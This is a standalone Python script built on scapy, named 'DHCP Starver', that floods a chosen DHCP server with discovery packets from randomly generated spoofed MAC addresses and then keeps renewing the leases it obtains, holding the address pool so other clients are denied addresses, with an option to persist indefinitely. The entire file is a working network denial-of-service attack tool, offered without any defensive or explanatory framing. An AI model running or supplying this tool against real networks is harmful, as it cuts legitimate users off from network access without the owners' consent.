#!/usr/bin/env python3
from argparse import ArgumentParser
from scapy.all import *
import threading
import time
import ipaddress


# tested with python3

def randomMac():
    firstByte = hex(int((bin(random.getrandbits(6)) + '10')[2:].zfill(8), 2))[2:]

    def hexB():
        return hex(int(random.getrandbits(8)))[2:]

    return firstByte + ":" + hexB() + ":" + hexB() + ":" + hexB() + ":" + hexB() + ":" + hexB()


def getIPCount(ip_addr_start, ip_addr_end):
    ip_range = ipaddress.summarize_address_range(ipaddress.IPv4Address(ip_addr_start),
                                                 ipaddress.IPv4Address(ip_addr_end))
    ip_count = 0
    for subnet in ip_range:
        ip_count += subnet.num_addresses
    return ip_count


def getIPList(ip_addr_start, ip_addr_end):
    return [str(ip) for subnet in
            ipaddress.summarize_address_range(ipaddress.IPv4Address(ip_addr_start), ipaddress.IPv4Address(ip_addr_end))
            for ip in subnet]


# returns true if ip2 > ip1
def isIPHigher(ip1, ip2):
    return ipaddress.IPv4Address(ip2) > ipaddress.IPv4Address(ip1)


attack_macs = []


class DhcpRequest(threading.Thread):
    def __init__(self, ip_dict):
        threading.Thread.__init__(self, name='requestSender', daemon=True)
        self.ip_dict = ip_dict

    def run(self):
        while True:
            for ip, metadata in self.ip_dict.items():
                if not 'lease_expire' in metadata.keys() or metadata['lease_expire'] - time.time() < 5.0:
                    if 'src_mac' in metadata.keys():
                        src_mac = metadata['src_mac']
                    else:
                        src_mac = getUniqueMac()
                        attack_macs.append(src_mac)
                        metadata['src_mac'] = src_mac
                    sendRequest(ip, src_mac)
                    metadata['lease_expire'] = time.time() + 600
                    self.ip_dict[ip] = metadata


macAddresses = []


def getUniqueMac():
    while True:
        macAddr = randomMac()
        if macAddr not in macAddresses:
            macAddresses.append(macAddr)
            return macAddr


# to discover range of dhcp leasing addresses
class DhcpDiscoverFlood(threading.Thread):
    def __init__(self, target_server, stop_event, timeout=10, count=-1):
        threading.Thread.__init__(self, name='discoverFlood', daemon=True)
        self.target_server = target_server
        self.stop_event = stop_event
        self.timeout = timeout
        self.count = count

    def run(self):
        time_started = time.time()
        while not self.stop_event.isSet() and time.time() - time_started < self.timeout and self.count != 0:
            mac_addr = getUniqueMac()
            attack_macs.append(mac_addr)
            sendDiscover(mac_addr, self.target_server)
            self.count -= 1
        print('finished discover flood')


def getRandTransID():
    return random.randint(0, 0xFFFFFFFF)


def sendDiscover(macAddr, server_ip):
    transID = getRandTransID()
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=macAddr) / IP(dst='255.255.255.255', src='0.0.0.0') \
          / UDP(sport=68, dport=67) / BOOTP(op=1, xid=transID, chaddr=[mac2str(macAddr)]) \
          / DHCP(options=[("message-type", "discover"),
                          ("server_id", server_ip),
                          'end'])
    sendPkt(pkt)


def sendRequest(request_addr, src_mac):
    transID = getRandTransID()
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=src_mac) / IP(dst="255.255.255.255", src="0.0.0.0") \
          / UDP(dport=67, sport=68) / BOOTP(op=1, xid=transID, chaddr=[mac2str(src_mac)]) \
          / DHCP(options=[('message-type', 'request'),
                          ('requested_addr', request_addr),
                          ('hostname', 'jonDeRipper'),
                          # ('server_id', self.server_ip),
                          'end'])
    sendPkt(pkt)


def sendPkt(pkt):
    sendp(pkt, iface='eth0', verbose=0)


def getDhcpOption(pkt, op):
    dhcp_options = pkt[DHCP].options
    for i in dhcp_options:
        if type(i) == tuple:
            if i[0] == op:
                return i[1]
    raise Exception('dhcp option ' + op + ' not found in pkt')


def getDhcpMessageType(pkt):
    options = pkt[DHCP].options
    return getDhcpOption(pkt, 'message-type')


# populates ips list whenever dhcp response received from dhcp server with new lease IP address
class DhcpSniffer(threading.Thread):
    def __init__(self, iface, ip_dict, disc_stop_event, timeout=5):
        threading.Thread.__init__(self, name='dhcpSniffer', daemon=True)
        self.iface = iface
        self.ip_dict = ip_dict
        self.disc_stop_event = disc_stop_event
        self.timeout = timeout

    def offerCallback(self, pkt):
        offered_ip = pkt[BOOTP].yiaddr
        if offered_ip not in self.ip_dict.keys():
            self.ip_dict[offered_ip] = {}
        print('dhcp offer detected')

    def ackCallback(self, pkt):
        acked_ip = pkt[BOOTP].yiaddr
        acked_client_mac = pkt[Ether].dst
        offer_time = getDhcpOption(pkt, 'lease_time')  # in seconds
        if acked_client_mac not in attack_macs:
            print('detected client', acked_client_mac, 'with allocated IP', acked_ip)
        else:
            print('success! IP', acked_ip, 'successfully drained for next', offer_time, 'seconds')
        self.ip_dict[acked_ip] = {'lease_expire': time.time() + offer_time, 'src_mac': acked_client_mac}

    def nackCallback(self, pkt):
        # when nack received, stop sending discovery packets
        self.disc_stop_event.set()

    def dhcpPktCallback(self, pkt):
        msg_type = getDhcpMessageType(pkt)
        print('in dhcp pkt callback:', msg_type, pkt[BOOTP].show())
        if msg_type == 2:  # offer
            self.offerCallback(pkt)
        elif msg_type == 5:  # ack
            self.ackCallback(pkt)
        elif msg_type == 6:  # nack
            self.nackCallback(pkt)

    def run(self):
        sniff(iface=self.iface, store=0, prn=self.dhcpPktCallback,
              filter='src port 67', lfilter=lambda pkt: pkt.haslayer(DHCP))  # , timeout=self.timeout)
        print('finished dhcp sniff')


def main():
    desciption = "DHCP Starver"
    parser = ArgumentParser(description=desciption)
    parser.add_argument('-t', '--target', required=True, help='specify DHCP server IP')
    parser.add_argument('-i', '--iface', default='eth0', help='specify interface for DHCP starver to use')
    parser.add_argument('-r', '--range', default=100, help='max range of IPs in DHCP allocation')
    parser.add_argument('-p', '--persist', action='store_true', default=False,
                        help='if flag is specified, will persist DHCP starvation attack until %(prog)s is terminated')

    parsed_args = parser.parse_args()
    iface = parsed_args.iface
    target = parsed_args.target
    persist = parsed_args.persist
    ip_range = parsed_args.range

    ips_to_drain = {}
    disc_stop_event = threading.Event()

    DhcpSniffer(iface, ips_to_drain, disc_stop_event, timeout=5).start()
    DhcpDiscoverFlood(target, disc_stop_event, count=ip_range).start()
    DhcpRequest(ips_to_drain).start()

    for t in threading.enumerate():
        try:
            t.join()
        except:
            pass


if __name__ == '__main__':
    main()
